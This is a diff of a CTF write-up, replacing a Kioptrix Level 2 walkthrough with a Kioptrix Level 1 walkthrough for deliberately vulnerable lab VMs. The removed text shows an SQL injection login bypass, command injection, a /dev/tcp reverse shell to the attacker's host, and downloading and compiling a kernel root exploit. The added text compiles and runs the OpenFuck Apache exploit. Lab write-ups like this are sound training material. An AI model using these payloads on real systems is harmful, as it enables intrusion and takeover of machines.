@@ -1,71 +1,52 @@
-# Kioptrix Level 2
+# Kioptrix Level 1
 
-Today, we will be attempting to gain root access to the machine "Kioptrix 2". The second part of the Kioptrix series, please note this machine is also very easy so if you are more experienced I recommend you leave this machine alone.
+Potentially one of the easiest CTF's ever...Kioptrix
+However, it is a very good CTF nonetheless.
 
-# *Requirements/Setup*
+# Setup/Prequisities
+- A Brain
+- Able to host Kioptrix virtual machine
 - Nmap
-- A brain
-- Ability to host the machine
-- $IP defined as your vulnerable machines IP - (`export $IP=[ip]`).
 
-# *Enumeration*
+Once you have setup your Kioptrix vm, find its IP using
+ `netdiscover -i eth0` and the run `export IP=[machine-ip]`, this will simply create a variable called IP defined as your machine's IP so you do not need to remeber it.
 
-As per routine, we will run a standard nmap scan to being our ventures into this machine.
+# Enumeration
 
-![enter image description here](https://github.com/7ud/writeups/blob/main/Vulnhub/images/kioptrix2/Screenshot_2022-10-27_12-52-48.png?raw=true)
+First, we'll run a routine nmap scan and save the output to a file for fututre reference.
 
-```bash
-nmap -sV -sC -oN initial.txt $IP
-```
-
-After running this scan, we can see it is running an **Apache server** on port `80` and `443`. This could be a potential entry point, upon opening the webserver in our browser, we see a login page.
-
-![enter image description here](https://github.com/7ud/writeups/blob/main/Vulnhub/images/kioptrix2/Screenshot_2022-10-28_03-53-25.png?raw=true)
-
-Before we run any vulnerability scans, we'll try out a simple test to see if we can perform any SQL injection by typing `admin'#` into the username box.
-
-![enter image description here](https://github.com/7ud/writeups/blob/main/Vulnhub/images/kioptrix2/Screenshot_2022-10-28_03-54-01.png?raw=true)
-
-Fortunately, it worked and it even gave us access to a new page which looks like we could perform command injection on. 
-
-![enter image description here](https://github.com/7ud/writeups/blob/main/Vulnhub/images/kioptrix2/Screenshot_2022-10-28_03-57-08.png?raw=true)
-
-By entering the IP address of a server we want to ping and then typing `&& whoami` after it proves we can remotely execute commands from the website. From here, we can try to get a revshell by starting up a netcat listener in a new terminal with:
-```bash
-nc -lvnp 443
-```
-Now, we need to execute a command on the website so as it creates a reverse shell, to do this, we will enter the following into the website:
-```bash
-sh -i >& /dev/tcp/[your-eth0-ip]/443 0>&1
-```
-If completed successfully, you should have a working reverse shell!
-
-![enter image description here](https://github.com/7ud/writeups/blob/main/Vulnhub/images/kioptrix2/Screenshot_2022-10-28_04-05-47.png?raw=true)
-
-However, we still haven't gained root, so we are not done yet. First, using a tool called `SearchSploit` we are going to find some potential exploits we can use to perform privilege escalation.
-
-![enter image description here](https://github.com/7ud/writeups/blob/main/Vulnhub/images/kioptrix2/Screenshot_2022-10-28_04-10-47.png?raw=true)
+![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_26_10_2022_15_38_10.png?raw=true)
 
 ```bash
-searchsploit centos
+nmap -sV -sC -oN scan.txt $IP
 ```
-The exploit `9545.c` seems to be a good option, to get thix exploit run:
- ```bash
-cp /usr/share/exploitdb/exploits/linux/local/9545.c ~/
-```
-From here, we have to transfer this file to the machine we are attacking, to do so run the following:
-```bash
-python3 -m http.server 80
-```
-After this, your eth0 IP should route to a webserver with some files in it. Now in your rev shell run:
-```bash
-cd /tmp
-curl http://[your-ip]/9545.c -o 9545.c
-```
-Almost there! Now we need to compile the C file using gcc.
-```bash
-gcc -o kioptrix 9545.c`
-```
-![enter image description here](https://github.com/7ud/writeups/blob/main/Vulnhub/images/kioptrix2/Screenshot_2022-10-28_04-18-20.png?raw=true)
+As you can see, we have 6 services running on the machine them being ssh,  http, rpcbind, netbios-ssn, https and filenet-tms. There is definitely a webserver running on this machine, upon visiting it in our browser we see a default apache test page. 
+Our nmap scan shows us that it is running Apache version 1.3.20, after a quick google search, I've found that there is a known exploit for this version of Apache (called OpenFuck).
 
-And then simply run `./kioptrix` and if all done correctly you will have root access on the machine! Congrats!
+![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/Screenshot%202022-10-26%20154801.png?raw=true)
+
+However, this exploit looks a little outdated, so in this case we'll be using a version of the OpenFuck by Helton Wernik [here](https://github.com/heltonWernik/OpenLuck).
+So first, lets set this exploit up. As per the github repo's installation instructions, we'll run the following:
+```bash
+git clone https://github.com/heltonWernik/OpenFuck.git
+apt-get install libssl-dev
+gcc -o OpenFuck OpenFuck.c -lcrypto
+```
+
+![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_26_10_2022_15_54_02.png?raw=true)
+
+Almost there! Now, we are going to execute the exploit to do this, we'll need to use the exploit `0x6a`.
+
+![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_26_10_2022_15_58_12.png?raw=true)
+
+```bash
+./OpenFuck 0x6a [machine-ip] 443 -c 40
+```
+If using the option `0x6a` fails, try `0x6b`. If that also fails then restart Kioptrix and restart Kali. In addition, try running tcpdump to troubleshoot.
+If executed correctly, you should get a shell. Congrats!
+From here, we need to make our shell a bit more useable. So run `/bin/bash -i`. Now we need to do some more digging. What i always do first is to run the `history` command to view the commands that have been executed in that machine. 
+There aren't too many interesting commands however the command `mail` does seem to stand out. 
+
+![enter image description here](https://github.com/benjibrown/ctf-writeups/blob/main/VulnHub/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_26_10_2022_16_02_00.png?raw=true)
+
+After running it, we are greeted with 2 emails, enter 1 to view the first and 2 to view the second. From there, we can see we have successfully pwned Kioptrix!
